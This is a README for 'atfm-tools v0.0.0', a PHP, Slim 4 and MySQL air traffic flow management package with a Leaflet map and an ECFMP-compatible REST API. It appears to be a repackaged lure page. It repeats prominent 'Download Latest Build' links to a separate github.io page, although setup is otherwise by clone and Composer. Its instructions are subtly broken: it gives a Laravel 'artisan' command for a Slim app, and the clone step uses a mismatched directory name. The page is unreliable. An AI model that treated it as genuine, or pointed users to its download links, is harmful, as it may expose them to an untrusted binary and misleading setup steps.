# atfm-tools v0.0.0 - Air Traffic Flow Management toolset 2026

> **A lightweight ATFM package for PHP shared hosting, combining a Slim 4 and MySQL backend with a Leaflet map interface, a focused flow-management process, and API compatibility with ECFMP flow shapes.**

[![Platform](https://img.shields.io/badge/Platform-PHP%20shared%20hosting-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryangreenxull8583/atfm-tools-v0-0-0?style=flat-square)](https://github.com/ryangreenxull8583/atfm-tools-v0-0-0)

---

<p align="center">
  <a href="https://ryangreenxull8583.github.io/atfm-tools-v0-0-0/">
    <img src="https://img.shields.io/badge/Download-atfm--tools%20Latest-brightgreen?style=for-the-badge" alt="Download atfm-tools">
  </a>
</p>

> **[Download atfm-tools v0.0.0](https://ryangreenxull8583.github.io/atfm-tools-v0-0-0/)**

---

[Download Latest Build](https://ryangreenxull8583.github.io/atfm-tools-v0-0-0/)

---

## Overview

atfm-tools provides a compact approach to air traffic flow management for environments where deployment resources are limited. Its PHP, MySQL, Slim 4, and Eloquent stack is intended to operate on practical shared-hosting infrastructure without the overhead of a larger application platform.

The package brings together a REST API, a Leaflet-powered browser frontend, and ECFMP-compatible flow-shape support. This gives teams a structured way to manage flow data through database-backed workflows, optional connections to remote flow sources, and reusable reference material supplied through vendored submodules.

---

## What It Provides

- A focused ATFM workflow for smaller-scale deployments
- REST endpoints compatible with ECFMP flow shapes
- A PHP application layout appropriate for shared hosting
- Leaflet maps for displaying and working with flows
- MySQL persistence through Eloquent integration
- Migration and seeding support for consistent database initialization
- An optional client for retrieving flows from external sources
- Vendored reference submodules included with the project

---

## Getting Started

First clone the repository and move into the project directory:

```bash
git clone https://github.com/ryangreenxull8583/atfm-tools-v0-0-0.git
cd atfm-tools
```

Install the Composer dependencies when Composer is available in your environment:

```bash
composer install
```

Prepare the database for the first run by applying the migrations and seed data:

```bash
php artisan migrate --seed
```

For a shared-hosting deployment, place the project files in the PHP-enabled web directory and configure the document root to use the application's public entry point.

---

## Using the Application

Once installation is complete, visit the web interface to use the Leaflet map and access the ATFM workflow screens.

A standard setup sequence is:

1. Set the database connection details.
2. Apply the migrations and load the initial seed data.
3. Launch the PHP application through the hosting environment.
4. Read or send flow information through the REST API using ECFMP-compatible shapes.
5. Turn on the optional remote flow client when external flow sources are part of the deployment.

The exact API request examples depend on the routes and hosting configuration in use. The application itself follows a REST-oriented design with a map-centered presentation layer.

---

## Settings

Runtime options are generally supplied through the application environment and database configuration.

For example:

```env
APP_ENV=production
APP_DEBUG=false
DB_CONNECTION=mysql
DB_HOST=localhost
DB_DATABASE=atfm_tools
DB_USERNAME=user
DB_PASSWORD=secret
REMOTE_FLOW_CLIENT=false
```

Replace the sample database values with the credentials for your hosting account. Set the remote flow option according to whether external flow data is required.

---

## System Requirements

- A PHP hosting environment
- MySQL
- PHP application routing and REST API support
- Composer for local dependency installation
- Sufficient storage for the application, migrations, seed data, and vendored references
- Web server configuration capable of serving both the Leaflet frontend and API routes

---

## Frequently Asked Questions

**What deployment environment is recommended?**  
The project targets modest PHP shared-hosting environments, while remaining usable in other environments that support PHP.

**Is a map view included?**  
Yes. Leaflet supplies the map-based interface used for ATFM interaction.

**How are database credentials configured?**  
Set them in the environment or application configuration before running the migration and seed commands.

**What is the update process?**  
Pull the newest repository changes, update dependencies when necessary, and run migrations or seeders when a schema change calls for them.

**What should I inspect if the API is not working correctly?**  
Review the route configuration, database connection, and the flow-data shape being submitted. When the remote flow client is active, also confirm that its endpoint settings are correct.

---

## License

This project is released under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
